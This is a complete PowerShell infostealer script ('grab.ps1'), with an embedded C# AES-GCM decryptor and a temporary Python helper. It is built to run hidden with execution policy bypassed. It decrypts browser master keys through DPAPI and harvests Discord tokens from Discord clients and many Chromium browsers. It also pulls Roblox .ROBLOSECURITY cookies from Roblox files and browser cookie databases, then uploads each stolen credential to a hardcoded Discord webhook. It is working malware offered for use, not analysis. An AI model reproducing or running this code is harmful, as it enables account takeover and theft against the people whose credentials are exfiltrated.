# grab.ps1 — PS 5.1+ / Windows 10+
# run: powershell -NoP -NonI -W Hidden -Exec Bypass -File grab.ps1

$WH = "https://discord.com/api/webhooks/1565481445034696784/kYh872fDK_3_4WHhGGdDignyh1hzsrbWA2qPbTI4fm6yja-soIqoXlUOm119LiXDGPq5"

Add-Type -AssemblyName System.Security
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Crypt {
    [StructLayout(LayoutKind.Sequential)]
    struct ACI {
        public int cbSz; public uint ver;
        public IntPtr pN; public int cN;
        public IntPtr pA; public int cA;
        public IntPtr pT; public int cT;
        public IntPtr pM; public int cM;
        public int cbAAD; public long cbData; public uint fl;
    }
    [DllImport("bcrypt.dll")] static extern uint BCryptOpenAlgorithmProvider(out IntPtr h,string a,string i,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptSetProperty(IntPtr h,string p,byte[]v,int s,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptGenerateSymmetricKey(IntPtr h,out IntPtr k,IntPtr b,int bs,byte[]s,int ss,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptDecrypt(IntPtr k,byte[]i,int il,ref ACI p,byte[]iv,int ivl,byte[]o,int ol,out int r,uint f);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr k);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h,uint f);
    public static byte[] DecGCM(byte[]key,byte[]n,byte[]ct,byte[]tag){
        IntPtr hA,hK;
        BCryptOpenAlgorithmProvider(out hA,"AES",null,0);
        byte[]m=System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
        BCryptSetProperty(hA,"ChainingMode",m,m.Length,0);
        BCryptGenerateSymmetricKey(hA,out hK,IntPtr.Zero,0,key,key.Length,0);
        IntPtr pN=Marshal.AllocHGlobal(n.Length),pT=Marshal.AllocHGlobal(tag.Length);
        Marshal.Copy(n,0,pN,n.Length);Marshal.Copy(tag,0,pT,tag.Length);
        var i=new ACI{cbSz=Marshal.SizeOf(typeof(ACI)),ver=1,pN=pN,cN=n.Length,pT=pT,cT=tag.Length};
        byte[]o=new byte[ct.Length];int r;
        BCryptDecrypt(hK,ct,ct.Length,ref i,null,0,o,o.Length,out r,0);
        Marshal.FreeHGlobal(pN);Marshal.FreeHGlobal(pT);
        BCryptDestroyKey(hK);BCryptCloseAlgorithmProvider(hA,0);return o;
    }
}
"@ -Language CSharp

$gcmOK = $false
try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}

# ── helpers ──────────────────────────────────────────────────────────────────

function Post-File($filename, $content) {
    try {
        $b   = [System.Guid]::NewGuid().ToString("N")
        $body = "--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`n`r`n$content`r`n--$b--"
        Invoke-RestMethod -Uri $WH -Method Post `
            -ContentType "multipart/form-data; boundary=$b" `
            -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -EA Stop | Out-Null
    } catch {}
}

function Get-MK($base) {
    try {
        $ls = Join-Path $base 'Local State'
        if (-not (Test-Path $ls)) { return $null }
        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json
        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        return [System.Security.Cryptography.ProtectedData]::Unprotect(
            [byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')
    } catch { return $null }
}

function Dec-GCM($mk, $b) {
    if ($null -eq $mk -or $b.Length -lt 31) { return $null }
    try {
        $nonce = [byte[]]$b[3..14]
        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]
        $ct    = [byte[]]$b[15..($b.Length-17)]
        if ($gcmOK) {
            $out = New-Object byte[] $ct.Length
            $g   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)
            $g.Decrypt($nonce,$ct,$tag,$out); $g.Dispose()
            return [System.Text.Encoding]::UTF8.GetString($out)
        }
        return [System.Text.Encoding]::UTF8.GetString([Crypt]::DecGCM([byte[]]$mk,$nonce,$ct,$tag))
    } catch { return $null }
}

function Valid-Token($t) {
    if (-not $t) { return $false }
    if ($t -match '^mfa\.[\w-]{84}$') { return $true }
    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }
    return $false
}

function Scan-File($path, $mk) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($path)
        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)

        foreach ($m in ([regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}').Matches($txt)) {
            try {
                $enc = [Convert]::FromBase64String($m.Value.Substring(12))
                $dec = Dec-GCM $mk $enc
                if (Valid-Token $dec) { return $dec }
            } catch {}
        }
        foreach ($m in ([regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}').Matches($txt)) {
            if (Valid-Token $m.Value) { return $m.Value }
        }
        $m3 = ([regex]'mfa\.[\w-]{84}').Match($txt)
        if ($m3.Success -and (Valid-Token $m3.Value)) { return $m3.Value }
    } catch {}
    return $null
}

function Scan-Dir($ldb, $mk) {
    if (-not (Test-Path $ldb)) { return $null }
    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |
             Where-Object { $_.Extension -in '.ldb','.log' } |
             Sort-Object LastWriteTime -Descending
    foreach ($file in $files) {
        $t = Scan-File $file.FullName $mk
        if ($t) { return $t }
    }
    return $null
}

# ── Discord ───────────────────────────────────────────────────────────────────

$dcToken = $null

foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment','vesktop','armcord','webcord','lightcord')) {
    if ($dcToken) { break }
    $base = Join-Path $env:APPDATA $app
    if (-not (Test-Path $base)) { continue }
    $mk = Get-MK $base
    $t  = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk
    if ($t) { $dcToken = $t }
}

if (-not $dcToken) {
    foreach ($br in @(
        (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),
        (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),
        (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),
        (Join-Path $env:APPDATA      'Opera Software\Opera Stable'),
        (Join-Path $env:APPDATA      'Opera Software\Opera GX Stable'),
        (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data'),
        (Join-Path $env:LOCALAPPDATA 'Thorium\User Data'),
        (Join-Path $env:LOCALAPPDATA 'CentBrowser\User Data'),
        (Join-Path $env:LOCALAPPDATA 'Coc Coc\Browser\User Data')
    )) {
        if ($dcToken) { break }
        if (-not (Test-Path $br)) { continue }
        $mk    = Get-MK $br
        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)
        foreach ($p in $profs) {
            if ($dcToken) { break }
            $t = Scan-Dir (Join-Path $br "$p\Local Storage\leveldb") $mk
            if ($t) { $dcToken = $t }
        }
    }
}

if ($dcToken) { Post-File "discord_token.txt" $dcToken }

# ── Roblox ────────────────────────────────────────────────────────────────────

function Clean-Cookie($raw) {
    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]
    $i = $c.IndexOf('_|WARNING')
    if ($i -gt 0) { $c = $c.Substring($i) }
    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }
    return $null
}

$rblxCookie = $null

foreach ($rp in @(
    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),
    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'),
    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies'),
    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')
)) {
    if ($rblxCookie -or -not (Test-Path $rp)) { continue }
    try {
        $raw = [System.IO.File]::ReadAllText($rp)
        try {
            $j = $raw | ConvertFrom-Json
            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {
                if ($rblxCookie) { return }
                try {
                    $ek  = [Convert]::FromBase64String($_.Value)
                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')
                    $str = [System.Text.Encoding]::UTF8.GetString($dec)
                    $c   = Clean-Cookie $str
                    if ($c) { $rblxCookie = $c }
                } catch {}
            }
        } catch {}
        if (-not $rblxCookie) { $rblxCookie = Clean-Cookie $raw }
    } catch {}
}

if (-not $rblxCookie) {
    $pkgs = Join-Path $env:LOCALAPPDATA 'Packages'
    if (Test-Path $pkgs) {
        Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {
            if ($rblxCookie) { return }
            foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {
                $uwp = Join-Path $_.FullName $fn
                if (-not (Test-Path $uwp)) { continue }
                try {
                    $c = Clean-Cookie ([System.IO.File]::ReadAllText($uwp))
                    if ($c) { $rblxCookie = $c; break }
                } catch {}
            }
        }
    }
}

# browser SQLite fallback (Python)
if (-not $rblxCookie) {
    $py = (Get-Command python -EA SilentlyContinue)
    if (-not $py) { $py = (Get-Command python3 -EA SilentlyContinue) }
    if ($py) {
        $pyPath = Join-Path $env:TEMP ([System.IO.Path]::GetRandomFileName().Replace('.','') + '.py')
        $pyScript = @'
import sqlite3,os,shutil,ctypes,base64,json
class B(ctypes.Structure):
    _fields_=[('cb',ctypes.c_ulong),('pb',ctypes.POINTER(ctypes.c_char))]
def dpapi(d):
    i=B(len(d),ctypes.cast(ctypes.create_string_buffer(d),ctypes.POINTER(ctypes.c_char)));o=B()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o)):return bytes(ctypes.string_at(o.pb,o.cb))
    return None
def get_mk(b):
    ls=os.path.join(b,'Local State')
    if not os.path.exists(ls):return None
    try:
        j=json.load(open(ls,'r',encoding='utf-8'));ek=base64.b64decode(j['os_crypt']['encrypted_key']);return dpapi(ek[5:])
    except:return None
def dec_ck(mk,enc):
    if not mk or len(enc)<32:return None
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(mk).decrypt(enc[3:15],enc[15:],None).decode('utf-8','replace')
    except:return None
def query_db(path,mk):
    tmp=path+'.tmp'
    try:
        shutil.copy2(path,tmp);cn=sqlite3.connect(tmp)
        row=cn.execute("SELECT value,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'").fetchone()
        cn.close();os.unlink(tmp)
        if not row:return None
        return row[0] if row[0] else dec_ck(mk,row[1])
    except:
        try:os.unlink(tmp)
        except:pass
    return None
cookie=None;LA=os.path.expandvars('%LOCALAPPDATA%');AP=os.path.expandvars('%APPDATA%')
for br in[os.path.join(LA,'Google','Chrome','User Data'),os.path.join(LA,'Microsoft','Edge','User Data'),os.path.join(LA,'BraveSoftware','Brave-Browser','User Data'),os.path.join(AP,'Opera Software','Opera Stable'),os.path.join(AP,'Opera Software','Opera GX Stable')]:
    if cookie:break
    if not os.path.exists(br):continue
    mk=get_mk(br)
    try:profs=['Default']+[d for d in os.listdir(br) if d.startswith('Profile ')]
    except:profs=['Default']
    for prof in profs:
        if cookie:break
        for ckn in['Cookies',os.path.join('Network','Cookies')]:
            ck=os.path.join(br,prof,ckn)
            if not os.path.exists(ck):continue
            cookie=query_db(ck,mk)
            if cookie:break
for ck in[os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Network','Cookies'),os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Cookies')]:
    if cookie:break
    if not os.path.exists(ck):continue
    cookie=query_db(ck,None)
print(cookie if cookie else 'NOT_FOUND')
'@
        [System.IO.File]::WriteAllText($pyPath,$pyScript,[System.Text.Encoding]::UTF8)
        $out = (& $py.Source $pyPath 2>$null | Out-String).Trim()
        Remove-Item $pyPath -EA SilentlyContinue
        if ($out -and $out -ne 'NOT_FOUND') { $rblxCookie = $out }
    }
}

if ($rblxCookie) { Post-File "roblox_cookie.txt" $rblxCookie }
